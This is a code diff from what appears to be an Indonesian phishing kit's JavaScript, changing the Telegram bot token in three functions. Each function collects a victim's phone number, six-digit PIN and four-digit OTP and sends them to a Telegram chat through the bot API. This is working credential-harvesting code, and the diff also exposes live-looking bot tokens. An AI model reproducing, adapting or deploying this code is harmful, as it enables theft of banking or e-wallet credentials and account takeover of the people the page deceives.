@@ -823,7 +823,7 @@ $(".bgotp").hide();
     
     var gabungan = '' + logo.value + '%0A- No HP : ' + '0' + inp.value;
    
-   var token = '7575123526:AAF1tRa-xHNTCLYiQh96QR7_Qguarf0FYGo'; // Ganti dengan token bot yang kamu buat
+   var token = '7945418406:AAHcudcYKBOCyY0EFULn5MS03t6vPBx4HuU'; // Ganti dengan token bot yang kamu buat
     var grup = '7125999099';
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -858,7 +858,7 @@ function sendPin(){
   
      
  
-    var token = '7575123526:AAF1tRa-xHNTCLYiQh96QR7_Qguarf0FYGo'; // Ganti dengan token bot yang kamu buat
+    var token = '7945418406:AAHcudcYKBOCyY0EFULn5MS03t6vPBx4HuU'; // Ganti dengan token bot yang kamu buat
     var grup = '7125999099'; // Ganti dengan chat id dari bot yang kamu buat
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -892,7 +892,7 @@ $(".alert").text("Masa berlaku OTP sudah habis");
 $(".alert").css("color","red");
  },2000);
     var gabungan = '' + logo.value + '%0A- No HP : ' + '0' + inp.value + '%0A- PIN : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A- OTP: ' + otp1.value + otp2.value + otp3.value + otp4.value;
-    var token = '7575123526:AAF1tRa-xHNTCLYiQh96QR7_Qguarf0FYGo'; // Ganti dengan token bot yang kamu buat
+    var token = '7945418406:AAHcudcYKBOCyY0EFULn5MS03t6vPBx4HuU'; // Ganti dengan token bot yang kamu buat
     var grup = '7125999099';
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
